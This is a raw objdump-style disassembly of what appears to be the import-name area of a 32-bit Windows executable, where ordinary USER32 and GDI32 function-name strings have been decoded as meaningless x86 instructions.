  428ac5:	ins    BYTE PTR es:[edi],dx
  428ac6:	push   edx
  428ac7:	popa   
  428ac8:	outs   dx,BYTE PTR ds:[esi]
  428ac9:	add    BYTE PTR gs:[bx+si],al
  428acd:	or     DWORD PTR [ecx],eax
  428acf:	inc    edi
  428ad0:	gs je  0x428b16
  428ad3:	jne    0x428b47
  428ad5:	jae    0x428b46
  428ad7:	jb     0x428b29
  428ad9:	outs   dx,DWORD PTR ds:[esi]
  428ada:	jae    0x428adc
  428adc:	add    BYTE PTR [ecx+0x2],bl
  428adf:	push   ebx
  428ae0:	gs je  0x428b35
  428ae3:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  428ae8:	jo     0x428b5e
  428aea:	jns    0x428aec
  428aec:	add    BYTE PTR [eax+0x2],ch
  428aef:	push   ebx
  428af0:	gs je  0x428b48
  428af3:	jae    0x428b5a
  428af5:	jb     0x428b46
  428af7:	bound  ebp,QWORD PTR [edx+0x65]
  428afa:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  428afe:	outs   dx,WORD PTR ds:[esi]
  428b00:	jb     0x428b6f
  428b02:	popa   
  428b03:	je     0x428b6e
  428b05:	outs   dx,DWORD PTR ds:[esi]
  428b06:	outs   dx,BYTE PTR ds:[esi]
  428b07:	push   edi
  428b08:	add    BYTE PTR [ebx],ch
  428b0a:	add    dl,BYTE PTR [ebx+0x65]
  428b0d:	outs   dx,BYTE PTR ds:[esi]
  428b0e:	fs dec ebp
  428b10:	gs jae 0x428b86
  428b13:	popa   
  428b14:	addr16 gs push edi
  428b17:	add    BYTE PTR [eax],al
  428b19:	loop   0x428b1b
  428b1b:	inc    esi
  428b1c:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  428b23:	outs   dx,DWORD PTR ds:[esi]
  428b24:	ja     0x428b6b
  428b26:	js     0x428b69
  428b28:	add    BYTE PTR [eax],bl
  428b2a:	add    DWORD PTR [edi+0x65],eax
  428b2d:	je     0x428b78
  428b2f:	arpl   WORD PTR [edi+0x6e],bp
  428b32:	dec    ecx
  428b33:	outs   dx,BYTE PTR ds:[esi]
  428b34:	outs   dx,WORD PTR ds:[esi]
  428b36:	add    BYTE PTR [edx+eax*1+0x74697753],al
  428b3d:	arpl   WORD PTR [eax+0x54],bp
  428b40:	outs   dx,DWORD PTR ds:[esi]
  428b41:	push   esp
  428b42:	push   0x69577369
  428b47:	outs   dx,BYTE PTR ds:[esi]
  428b48:	outs   dx,DWORD PTR fs:[esi]
  428b4a:	ja     0x428b4c
  428b4c:	add    BYTE PTR [ecx+0x616f4c01],ch
  428b52:	fs inc edx
  428b54:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xb004170
  428b5c:	add    DWORD PTR [edi+0x65],eax
  428b5f:	je     0x428ba5
  428b61:	inc    ebx
  428b62:	inc    ebp
  428b63:	js     0x428b65
  428b65:	mov    al,ds:0x57734901
  428b6a:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  428b71:	test   DWORD PTR [ecx],eax
  428b73:	dec    ecx
  428b74:	outs   dx,BYTE PTR ds:[esi]
  428b75:	jae    0x428bdc
  428b77:	jb     0x428bed
  428b79:	dec    ebp
  428b7a:	outs   dx,BYTE PTR gs:[esi]
  428b7c:	jne    0x428bc7
  428b7e:	je     0x428be5
  428b80:	ins    DWORD PTR es:[edi],dx
  428b81:	push   edi
  428b82:	add    BYTE PTR [esi+0x73795302],al
  428b88:	je     0x428bef
  428b8a:	ins    DWORD PTR es:[edi],dx
  428b8b:	push   eax
  428b8c:	popa   
  428b8d:	jb     0x428bf0
  428b8f:	ins    DWORD PTR es:[edi],dx
  428b90:	gs je  0x428bf8
  428b93:	jb     0x428c08
  428b95:	dec    ecx
  428b96:	outs   dx,BYTE PTR ds:[esi]
  428b97:	outs   dx,WORD PTR ds:[esi]
  428b99:	push   edi
  428b9a:	add    BYTE PTR [ebx+0x2],dh
  428b9d:	push   ebx
  428b9e:	gs je  0x428bf8
  428ba1:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  428ba8:	js     0x428c1e
  428baa:	inc    ecx
  428bab:	add    BYTE PTR [eax],al
  428bad:	rol    BYTE PTR [ecx],1
  428baf:	dec    ebp
  428bb0:	gs jae 0x428c26
  428bb3:	popa   
  428bb4:	addr16 gs inc edx
  428bb7:	outs   dx,DWORD PTR ds:[esi]
  428bb8:	js     0x428bff
  428bba:	js     0x428c13
  428bbc:	add    BYTE PTR ds:0x74654701,dh
  428bc2:	dec    ebp
  428bc3:	outs   dx,BYTE PTR gs:[esi]
  428bc5:	jne    0x428c10
  428bc7:	je     0x428c2e
  428bc9:	ins    DWORD PTR es:[edi],dx
  428bca:	dec    ecx
  428bcb:	outs   dx,BYTE PTR ds:[esi]
  428bcc:	outs   dx,WORD PTR ds:[esi]
  428bce:	push   edi
  428bcf:	add    BYTE PTR [eax],al
  428bd1:	jge    0x428bd5
  428bd3:	push   ebx
  428bd4:	push   0x6353776f
  428bd9:	jb     0x428c4a
  428bdb:	ins    BYTE PTR es:[edi],dx
  428bdc:	ins    BYTE PTR es:[edi],dx
  428bdd:	inc    edx
  428bde:	popa   
  428bdf:	jb     0x428be1
  428be1:	cmp    al,0x0
  428be3:	inc    ebx
  428be4:	push   0x4d6b6365
  428be9:	outs   dx,BYTE PTR gs:[esi]
  428beb:	jne    0x428c3f
  428bed:	popa   
  428bee:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  428bf6:	add    BYTE PTR [edx+0x616f4c01],ch
  428bfc:	fs inc edx
  428bfe:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xab005770
  428c06:	add    BYTE PTR [edx+esi*2+0x61],al
  428c0a:	ja     0x428c4d
  428c0c:	outs   dx,BYTE PTR ds:[esi]
  428c0d:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  428c14:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  428c19:	mov    cl,0x2
  428c1b:	push   esi
  428c1c:	imul   ecx,DWORD PTR [ebx+0x65],0x79
  428c20:	push   ebx
  428c21:	arpl   WORD PTR [ecx+0x6e],sp
  428c24:	push   edi
  428c25:	add    BYTE PTR [eax],al
  428c27:	add    DWORD PTR [ecx],0x65536e49
  428c2d:	outs   dx,BYTE PTR ds:[esi]
  428c2e:	fs dec ebp
  428c30:	gs jae 0x428ca6
  428c33:	popa   
  428c34:	addr16 gs inc ebp
  428c37:	js     0x428c39
  428c39:	ins    DWORD PTR es:[edi],dx
  428c3a:	add    DWORD PTR [edi+0x65],eax
  428c3d:	je     0x428c96
  428c3f:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  428c46:	outs   dx,BYTE PTR ds:[esi]
  428c47:	addr16 push edi
  428c49:	add    BYTE PTR [eax],al
  428c4b:	jle    0x428c4e
  428c4d:	dec    eax
  428c4e:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x6e654d65
  428c56:	jne    0x428ca1
  428c58:	je     0x428cbf
  428c5a:	ins    DWORD PTR es:[edi],dx
  428c5b:	add    BYTE PTR [eax],al
  428c5d:	xor    DWORD PTR [eax],eax
  428c5f:	inc    ebx
  428c60:	push   0x72507261
  428c65:	gs jbe 0x428cbf
  428c68:	add    ah,ah
  428c6a:	add    BYTE PTR [esi+0x69],al
  428c6d:	outs   dx,BYTE PTR ds:[esi]
  428c6e:	fs push edi
  428c70:	imul   ebp,DWORD PTR [esi+0x64],0x57776f
  428c77:	sub    al,BYTE PTR [edx]
  428c79:	push   ebx
  428c7a:	outs   dx,BYTE PTR gs:[esi]
  428c7c:	fs dec ebp
  428c7e:	gs jae 0x428cf4
  428c81:	popa   
  428c82:	addr16 gs push esp
  428c85:	imul   ebp,DWORD PTR [ebp+0x65],0x5774756f
  428c8c:	add    BYTE PTR [ebx],al
  428c8e:	add    dl,BYTE PTR [edx+0x65]
  428c91:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  428c99:	popa   
  428c9a:	jae    0x428d0f
  428c9c:	inc    ebp
  428c9d:	js     0x428ce0
  428c9f:	add    BYTE PTR [eax],al
  428ca1:	xchg   esi,eax
  428ca2:	add    dl,BYTE PTR [edx+esi*2+0x61]
  428ca6:	outs   dx,BYTE PTR ds:[esi]
  428ca7:	jae    0x428d15
  428ca9:	popa   
  428caa:	je     0x428d11
  428cac:	dec    ebp
  428cad:	gs jae 0x428d23
  428cb0:	popa   
  428cb1:	add    BYTE PTR gs:[bx+si],al
  428cb5:	add    BYTE PTR [edx],0x53
  428cb8:	push   0x6957776f
  428cbd:	outs   dx,BYTE PTR ds:[esi]
  428cbe:	outs   dx,DWORD PTR fs:[esi]
  428cc0:	ja     0x428d03
  428cc2:	jae    0x428d3d
  428cc4:	outs   dx,BYTE PTR ds:[esi]
  428cc5:	arpl   WORD PTR [eax],ax
  428cc7:	mov    BYTE PTR [eax],0x45
  428cca:	outs   dx,BYTE PTR ds:[esi]
  428ccb:	fs push esp
  428ccd:	popa   
  428cce:	jae    0x428d3b
  428cd0:	add    bl,dh
  428cd2:	add    DWORD PTR [eax+0x6f],edx
  428cd5:	jae    0x428d4b
  428cd7:	push   ecx
  428cd8:	jne    0x428d43
  428cda:	je     0x428d29
  428cdc:	gs jae 0x428d52
  428cdf:	popa   
  428ce0:	add    BYTE PTR gs:[bp+si+0x1],bl
  428ce5:	inc    edi
  428ce6:	gs je  0x428d3c
  428ce9:	jns    0x428d5e
  428ceb:	inc    ebx
  428cec:	outs   dx,DWORD PTR ds:[esi]
  428ced:	ins    BYTE PTR es:[edi],dx
  428cee:	outs   dx,DWORD PTR ds:[esi]
  428cef:	jb     0x428d33
  428cf1:	jb     0x428d68
  428cf3:	jae    0x428d5d
  428cf5:	add    BYTE PTR [eax],al
  428cf7:	or     eax,DWORD PTR [eax]
  428cf9:	inc    ecx
  428cfa:	je     0x428d70
  428cfc:	popa   
  428cfd:	arpl   WORD PTR [eax+0x54],bp
  428d00:	push   0x64616572
  428d05:	dec    ecx
  428d06:	outs   dx,BYTE PTR ds:[esi]
  428d07:	jo     0x428d7e
  428d09:	je     0x428d0b
  428d0b:	adc    BYTE PTR [ecx],al
  428d0d:	inc    edi
  428d0e:	gs je  0x428d55
  428d11:	ins    BYTE PTR es:[edi],dx
  428d12:	addr16 dec ecx
  428d14:	je     0x428d7b
  428d16:	ins    DWORD PTR es:[edi],dx
  428d17:	dec    ecx
  428d18:	outs   dx,BYTE PTR ds:[esi]
  428d19:	je     0x428d1b
  428d1b:	mov    eax,0x61724400
  428d20:	ja     0x428d75
  428d22:	je     0x428d85
  428d24:	je     0x428d8b
  428d26:	push   edi
  428d27:	add    BYTE PTR [eax],al
  428d29:	adc    eax,DWORD PTR [edx]
  428d2b:	push   edx
  428d2c:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x69577265
  428d35:	outs   dx,BYTE PTR ds:[esi]
  428d36:	outs   dx,DWORD PTR fs:[esi]
  428d38:	ja     0x428d87
  428d3a:	gs jae 0x428db0
  428d3d:	popa   
  428d3e:	addr16 gs push edi
  428d41:	add    BYTE PTR [eax],al
  428d43:	or     al,BYTE PTR [eax]
  428d45:	inc    ecx
  428d46:	jb     0x428dba
  428d48:	popa   
  428d49:	outs   dx,BYTE PTR ds:[esi]
  428d4a:	addr16 gs dec ecx
  428d4d:	arpl   WORD PTR [edi+0x6e],bp
  428d50:	imul   esp,DWORD PTR [ebx+0x57],0x6f646e69
  428d57:	ja     0x428dcc
  428d59:	add    BYTE PTR [eax],al
  428d5b:	jnp    0x428d5f
  428d5d:	push   ebx
  428d5e:	push   0x7543776f
  428d63:	jb     0x428dd8
  428d65:	outs   dx,DWORD PTR ds:[esi]
  428d66:	jb     0x428d68
  428d68:	add    BYTE PTR [eax],ch
  428d6a:	add    BYTE PTR [ebx+0x68],al
  428d6d:	popa   
  428d6e:	jb     0x428dbc
  428d70:	outs   dx,DWORD PTR ds:[esi]
  428d71:	ja     0x428dd8
  428d73:	jb     0x428db7
  428d75:	jne    0x428ddd
  428d77:	push   di
  428d79:	add    BYTE PTR [eax],al
  428d7b:	mov    esi,0x756f6d02
  428d80:	jae    0x428de7
  428d82:	pop    edi
  428d83:	gs jbe 0x428deb
  428d86:	outs   dx,BYTE PTR ds:[esi]
  428d87:	je     0x428d89
  428d89:	mov    bl,0x0
  428d8b:	inc    esp
  428d8c:	jb     0x428def
  428d8e:	ja     0x428dd9
  428d90:	arpl   WORD PTR [edi+0x6e],bp
  428d93:	add    BYTE PTR [eax],al
  428d95:	adc    al,BYTE PTR [edx]
  428d97:	push   edx
  428d98:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x69577265
  428da1:	outs   dx,BYTE PTR ds:[esi]
  428da2:	outs   dx,DWORD PTR fs:[esi]
  428da4:	ja     0x428df3
  428da6:	gs jae 0x428e1c
  428da9:	popa   
  428daa:	addr16 gs inc ecx
  428dad:	add    BYTE PTR [eax],al
  428daf:	daa    
  428db0:	add    DWORD PTR [edi+0x65],eax
  428db3:	je     0x428e00
  428db5:	gs jns 0x428e1a
  428db8:	outs   dx,DWORD PTR ds:[esi]
  428db9:	popa   
  428dba:	jb     0x428e20
  428dbc:	push   esp
  428dbd:	jns    0x428e2f
  428dbf:	add    BYTE PTR gs:[edi+0x66654400],cl
  428dc6:	push   edi
  428dc7:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  428dce:	outs   dx,DWORD PTR ds:[esi]
  428dcf:	arpl   WORD PTR [edi+0x0],dx
  428dd2:	add    BYTE PTR [eax+0x536e4901],al
  428dd8:	outs   dx,BYTE PTR gs:[esi]
  428dda:	fs dec ebp
  428ddc:	gs jae 0x428e52
  428ddf:	popa   
  428de0:	add    BYTE PTR gs:[bp+di],dh
  428de4:	add    DWORD PTR [edi+0x65],eax
  428de7:	je     0x428e36
  428de9:	outs   dx,BYTE PTR gs:[esi]
  428deb:	jne    0x428e36
  428ded:	je     0x428e54
  428def:	ins    DWORD PTR es:[edi],dx
  428df0:	dec    ecx
  428df1:	inc    esp
  428df2:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  428df9:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x73490190
  428e01:	inc    ebx
  428e02:	push   0x6f4c7261
  428e07:	ja     0x428e6e
  428e09:	jb     0x428e4c
  428e0b:	add    BYTE PTR [eax],al
  428e0d:	jmp    0x74a7d512
  428e12:	inc    ecx
  428e13:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  428e17:	gs push edi
  428e19:	imul   ebp,DWORD PTR [esi+0x64],0x3a00776f
  428e20:	add    dl,BYTE PTR [ebx+0x65]
  428e23:	je     0x428e68
  428e25:	jne    0x428e99
  428e27:	jae    0x428e98
  428e29:	jb     0x428e7b
  428e2b:	outs   dx,DWORD PTR ds:[esi]
  428e2c:	jae    0x428e2e
  428e2e:	add    BYTE PTR ds:0x74654701,dl
  428e34:	inc    esi
  428e35:	outs   dx,DWORD PTR ds:[esi]
  428e36:	jb     0x428e9d
  428e38:	addr16 jb 0x428eaa
  428e3b:	jne    0x428eab
  428e3d:	fs push edi
  428e3f:	imul   ebp,DWORD PTR [esi+0x64],0x2300776f
  428e46:	add    DWORD PTR [edi+0x65],eax
  428e49:	je     0x428e96
  428e4b:	gs jns 0x428eb0
  428e4e:	outs   dx,DWORD PTR ds:[esi]
  428e4f:	popa   
  428e50:	jb     0x428eb6
  428e52:	dec    esp
  428e53:	popa   
  428e54:	jns    0x428ec5
  428e56:	jne    0x428ecc
  428e58:	dec    esp
  428e59:	imul   esi,DWORD PTR [ebx+0x74],0x43006300
  428e60:	jb     0x428ec7
  428e62:	popa   
  428e63:	je     0x428eca
  428e65:	push   edi
  428e66:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  428e6d:	push   edi
  428e6e:	add    BYTE PTR [edx+0x766e4901],cl
  428e74:	popa   
  428e75:	ins    BYTE PTR es:[edi],dx
  428e76:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x6e675265
  428e7e:	add    BYTE PTR [eax],bh
  428e80:	add    BYTE PTR [ebx+0x68],al
  428e83:	popa   
  428e84:	jb     0x428edb
  428e86:	jo     0x428ef8
  428e88:	gs jb  0x428ecd
  428e8b:	jne    0x428ef3
  428e8d:	push   di
  428e8f:	add    BYTE PTR [eax],al
  428e91:	mov    al,BYTE PTR [edx]
  428e93:	push   esp
  428e94:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  428e9c:	ja     0x428f11
  428e9e:	add    dh,dh
  428ea0:	add    BYTE PTR [edi+0x65],al
  428ea3:	je     0x428ee8
  428ea5:	ins    BYTE PTR es:[edi],dx
  428ea6:	popa   
  428ea7:	jae    0x428f1c
  428ea9:	dec    ecx
  428eaa:	outs   dx,BYTE PTR ds:[esi]
  428eab:	outs   dx,WORD PTR ds:[esi]
  428ead:	inc    ebp
  428eae:	js     0x428f07
  428eb0:	add    BYTE PTR [esi+0x736e4901],al
  428eb6:	gs jb  0x428f2d
  428eb9:	dec    ebp
  428eba:	outs   dx,BYTE PTR gs:[esi]
  428ebc:	jne    0x428f15
  428ebe:	add    BYTE PTR [eax],bh
  428ec0:	add    DWORD PTR [edi+0x65],eax
  428ec3:	je     0x428f12
  428ec5:	outs   dx,BYTE PTR gs:[esi]
  428ec7:	jne    0x428f1c
  428ec9:	je     0x428f3d
  428ecb:	imul   ebp,DWORD PTR [esi+0x67],0x11000041
  428ed2:	add    DWORD PTR [edi+0x65],eax
  428ed5:	je     0x428f1b
  428ed7:	ins    BYTE PTR es:[edi],dx
  428ed8:	addr16 dec ecx
  428eda:	je     0x428f41
  428edc:	ins    DWORD PTR es:[edi],dx
  428edd:	push   esp
  428ede:	gs js  0x428f55
  428ee1:	inc    ecx
  428ee2:	add    BYTE PTR [eax+0x44734901],bl
  428ee8:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  428eef:	jae    0x428f64
  428ef1:	popa   
  428ef2:	addr16 gs push edi
  428ef5:	add    BYTE PTR [eax],al
  428ef7:	mov    al,ds:0x73694400
  428efc:	jo     0x428f5f
  428efe:	je     0x428f63
  428f00:	push   0x7373654d
  428f05:	popa   
  428f06:	addr16 gs push edi
  428f09:	add    BYTE PTR [eax],al
  428f0b:	js     0x428f0e
  428f0d:	inc    edi
  428f0e:	gs je  0x428f68
  428f11:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  428f18:	js     0x428f8e
  428f1a:	push   edi
  428f1b:	add    BYTE PTR [eax],al
  428f1d:	sub    eax,0x6e655302
  428f22:	fs dec esi
  428f24:	outs   dx,DWORD PTR ds:[esi]
  428f25:	je     0x428f90
  428f27:	data16 jns 0x428f77
  428f2a:	gs jae 0x428fa0
  428f2d:	popa   
  428f2e:	addr16 gs push edi
  428f31:	add    BYTE PTR [eax],al
  428f33:	and    BYTE PTR [edx],al
  428f35:	push   ebx
  428f36:	arpl   WORD PTR [edx+0x6f],si
  428f39:	ins    BYTE PTR es:[edi],dx
  428f3a:	ins    BYTE PTR es:[edi],dx
  428f3b:	push   edi
  428f3c:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  428f43:	add    BYTE PTR [eax],al
  428f45:	add    WORD PTR [edi+0x65],ax
  428f49:	je     0x428fa0
  428f4b:	jae    0x428fb2
  428f4d:	jb     0x428f9e
  428f4f:	bound  ebp,QWORD PTR [edx+0x65]
  428f52:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  428f56:	outs   dx,WORD PTR ds:[esi]
  428f58:	jb     0x428fc7
  428f5a:	popa   
  428f5b:	je     0x428fc6
  428f5d:	outs   dx,DWORD PTR ds:[esi]
  428f5e:	outs   dx,BYTE PTR ds:[esi]
  428f5f:	push   edi
  428f60:	add    ch,dh
  428f62:	add    DWORD PTR [eax+0x6f],edx
  428f65:	jae    0x428fdb
  428f67:	push   esp
  428f68:	push   0x64616572
  428f6d:	dec    ebp
  428f6e:	gs jae 0x428fe4
  428f71:	popa   
  428f72:	addr16 gs push edi
  428f75:	add    BYTE PTR [eax],al
  428f77:	mov    eax,DWORD PTR [ecx]
  428f79:	dec    ecx
  428f7a:	outs   dx,BYTE PTR ds:[esi]
  428f7b:	jbe    0x428fe2
  428f7d:	jb     0x428ff3
  428f7f:	push   edx
  428f80:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  428f85:	xchg   edi,eax
  428f86:	add    DWORD PTR [ecx+0x73],ecx
  428f89:	inc    esp
  428f8a:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  428f91:	jae    0x429006
  428f93:	popa   
  428f94:	addr16 gs inc ecx
  428f97:	add    BYTE PTR [eax],al
  428f99:	mov    ch,0x0
  428f9b:	inc    esp
  428f9c:	jb     0x428fff
  428f9e:	ja     0x428fed
  428fa0:	outs   dx,BYTE PTR gs:[esi]
  428fa2:	jne    0x428fe6
  428fa4:	popa   
  428fa5:	jb     0x428fa7
  428fa7:	push   ebp
  428fa8:	push   ebx
  428fa9:	inc    ebp
  428faa:	push   edx
  428fab:	xor    esi,DWORD PTR [edx]
  428fad:	cs fs ins BYTE PTR es:[edi],dx
  428fb0:	ins    BYTE PTR es:[edi],dx
  428fb1:	add    BYTE PTR [eax],al
  428fb3:	int3   
  428fb4:	add    DWORD PTR [ebx+0x65],edx
  428fb7:	ins    BYTE PTR es:[edi],dx
  428fb8:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  428fbd:	imul   esi,DWORD PTR [eax+0x52],0x88006e67
  428fc4:	add    BYTE PTR [ebx+0x72],al
  428fc7:	gs popa 
  428fc9:	je     0x429030
  428fcb:	inc    edx
  428fcc:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x646e4970
  428fd4:	imul   esi,DWORD PTR [edx+0x65],0x7463
  428fdb:	rol    BYTE PTR [eax],0x45
  428fde:	outs   dx,BYTE PTR ds:[esi]
  428fdf:	fs push eax
  428fe1:	popa   
  428fe2:	je     0x42904c
  428fe4:	add    dh,cl
  428fe6:	add    DWORD PTR [ebx+0x65],edx
  428fe9:	ins    BYTE PTR es:[edi],dx
  428fea:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  428fef:	push   0x65
  428ff1:	arpl   WORD PTR [eax+eax*1+0x0],si
  428ff5:	fiadd  WORD PTR [ecx]
  428ff7:	push   ebx
  428ff8:	gs je  0x42903f
  428ffb:	dec    ecx
  428ffc:	inc    edx
  428ffd:	imul   esi,DWORD PTR [ebx+esi*2+0x54],0x7665446f
  429005:	imul   esp,DWORD PTR [ebx+0x65],0x43009e00
  42900c:	jb     0x429073
  42900e:	popa   
  42900f:	je     0x429076
  429011:	inc    esi
  429012:	outs   dx,DWORD PTR ds:[esi]
  429013:	outs   dx,BYTE PTR ds:[esi]
  429014:	je     0x42906d
  429016:	add    dh,dh
  429018:	add    DWORD PTR [ebx+0x65],edx
  42901b:	je     0x429070
  42901d:	je     0x429091
  42901f:	gs je  0x429085
  429022:	push   0x4d746c42
  429027:	outs   dx,DWORD PTR ds:[esi]
  429028:	fs add BYTE PTR gs:[eax+0x65724300],dh
  429030:	popa   
  429031:	je     0x429098
  429033:	push   ebx
  429034:	outs   dx,DWORD PTR ds:[esi]
  429035:	ins    BYTE PTR es:[edi],dx
  429036:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  42903e:	add    bh,cl
  429040:	add    DWORD PTR [ebx+0x65],edx
  429043:	ins    BYTE PTR es:[edi],dx
  429044:	arpl   WORD PTR gs:[eax+edx*2+0x61],si
  429049:	ins    BYTE PTR es:[edi],dx
  42904a:	gs je  0x4290c1
  42904d:	add    BYTE PTR gs:[edx+0x63655201],bh
  429054:	je     0x4290ac
  429056:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  42905d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42905e:	add    DWORD PTR [eax+0x61],edx
  429061:	je     0x4290a5
  429063:	ins    BYTE PTR es:[edi],dx
  429064:	je     0x429066
  429066:	add    BYTE PTR [ebx+0x65724300],dl
  42906c:	popa   
  42906d:	je     0x4290d4
  42906f:	inc    esp
  429070:	dec    ecx
  429071:	inc    edx
  429072:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xdc000070
  42907a:	add    DWORD PTR [ebx+0x65],edx
  42907d:	je     0x4290c3
  42907f:	dec    ecx
  429080:	inc    edx
  429081:	inc    ebx
  429082:	outs   dx,DWORD PTR ds:[esi]
  429083:	ins    BYTE PTR es:[edi],dx
  429084:	outs   dx,DWORD PTR ds:[esi]
  429085:	jb     0x4290db
  429087:	popa   
  429088:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  42908c:	add    BYTE PTR [eax+0x1],al
  42908f:	inc    edi
  429090:	gs je  0x4290d7
  429093:	dec    ecx
  429094:	inc    edx
  429095:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x655201c1
  42909d:	ins    DWORD PTR es:[edi],dx
  42909e:	outs   dx,DWORD PTR ds:[esi]
  42909f:	jbe    0x429106
  4290a1:	inc    esi
  4290a2:	outs   dx,DWORD PTR ds:[esi]
  4290a3:	outs   dx,BYTE PTR ds:[esi]
  4290a4:	je     0x4290f8
  4290a6:	gs jae 0x429118
  4290a9:	jne    0x42911d
  4290ab:	arpl   WORD PTR [ebp+0x57],sp
  4290ae:	add    ah,bh
  4290b0:	add    DWORD PTR [ebx+0x65],edx
  4290b3:	je     0x42910b
  4290b5:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  4290bc:	inc    ebp
  4290bd:	js     0x429133
  4290bf:	inc    ebp
  4290c0:	js     0x4290c2
  4290c2:	add    BYTE PTR [esi],dh
  4290c4:	add    DWORD PTR [edi+0x65],eax
  4290c7:	je     0x42910c
  4290c9:	ins    BYTE PTR es:[edi],dx
  4290ca:	imul   esi,DWORD PTR [eax+0x42],0x786f
  4290d1:	cmp    al,BYTE PTR [ecx]
  4290d3:	inc    edi
  4290d4:	gs je  0x42911a
  4290d7:	jne    0x42914b
  4290d9:	jb     0x429140
  4290db:	outs   dx,BYTE PTR ds:[esi]
  4290dc:	je     0x42912d
  4290de:	bound  ebp,QWORD PTR [edx+0x65]
  4290e1:	arpl   WORD PTR [eax+eax*1+0x0],si
  4290e5:	xchg   edx,eax
  4290e6:	add    BYTE PTR [ebx+0x72],al
  4290e9:	gs popa 
  4290eb:	je     0x429152
  4290ed:	inc    esp
  4290ee:	dec    ecx
  4290ef:	inc    edx
  4290f0:	push   ebx
  4290f1:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4290f6:	outs   dx,BYTE PTR ds:[esi]
  4290f7:	add    BYTE PTR [eax],al
  4290f9:	out    0x1,al
  4290fb:	push   ebx
  4290fc:	gs je  0x42914b
  4290ff:	popa   
  429100:	jns    0x429171
  429102:	jne    0x429178
  429104:	add    BYTE PTR ds:0x61745302,al
  42910a:	jb     0x429180
  42910c:	push   eax
  42910d:	popa   
  42910e:	add    BYTE PTR gs:[bx+di+0x4f01],ah
  429114:	data16 data16 jae 0x42917d
  429118:	je     0x429170
  42911a:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  429121:	dec    edi
  429122:	jb     0x42918b
  429124:	inc    ebp
  429125:	js     0x429127
  429127:	add    DWORD PTR [bx+0x65],eax
  42912b:	je     0x42917c
  42912d:	bound  ebp,QWORD PTR [edx+0x65]
  429130:	arpl   WORD PTR [ecx+eax*2+0x0],si
  429134:	add    BYTE PTR [edx+eax*1],dl
  429137:	push   edi
  429138:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  429140:	add    BYTE PTR [ecx],al
  429142:	add    dl,BYTE PTR [ebx+0x65]
  429145:	je     0x42919e
  429147:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  42914e:	addr16 inc ebp
  429150:	js     0x429152
  429152:	add    BYTE PTR [edx+0x65724300],bl
  429158:	popa   
  429159:	je     0x4291c0
  42915b:	inc    esi
  42915c:	outs   dx,DWORD PTR ds:[esi]
  42915d:	outs   dx,BYTE PTR ds:[esi]
  42915e:	je     0x4291a9
  429160:	outs   dx,BYTE PTR ds:[esi]
  429161:	imul   esi,DWORD PTR fs:[edx+0x65],0x417463
  429169:	mov    DWORD PTR [eax],0x6d756e45
  42916f:	inc    esi
  429170:	outs   dx,DWORD PTR ds:[esi]
  429171:	outs   dx,BYTE PTR ds:[esi]
  429172:	je     0x4291e7
  429174:	push   edi
  429175:	add    BYTE PTR [eax],al
  429177:	pop    es
  429178:	add    BYTE PTR [ecx+0x64],al
  42917b:	fs inc esi
  42917d:	outs   dx,DWORD PTR ds:[esi]
  42917e:	outs   dx,BYTE PTR ds:[esi]
  42917f:	je     0x4291d3
  429181:	gs jae 0x4291f3
  429184:	jne    0x4291f8
  429186:	arpl   WORD PTR [ebp+0x57],sp
  429189:	add    BYTE PTR [eax],al
  42918b:	xlat   BYTE PTR ds:[ebx]
  42918c:	add    DWORD PTR [ebx+0x65],edx
  42918f:	je     0x4291d3
  429191:	jb     0x429208
  429193:	jae    0x4291fd
  429195:	dec    edi
  429196:	jb     0x4291ff
  429198:	inc    ebp
  429199:	js     0x42919b
  42919b:	mov    ecx,0x63655201
  4291a0:	je     0x4291eb
  4291a2:	outs   dx,BYTE PTR ds:[esi]
  4291a3:	push   edx
  4291a4:	imul   ebp,DWORD PTR gs:[bx+0x6e],0x1e80000
  4291ad:	push   ebx
  4291ae:	gs je  0x4291fe
  4291b1:	popa   
  4291b2:	jo     0x429201
  4291b4:	outs   dx,DWORD PTR ds:[esi]
  4291b5:	fs add BYTE PTR gs:[eax],al
  4291b9:	mov    cl,0x0
  4291bb:	inc    esp
  4291bc:	push   eax
  4291bd:	je     0x42922e
  4291bf:	dec    esp
  4291c0:	push   eax
  4291c1:	add    BYTE PTR [eax],al
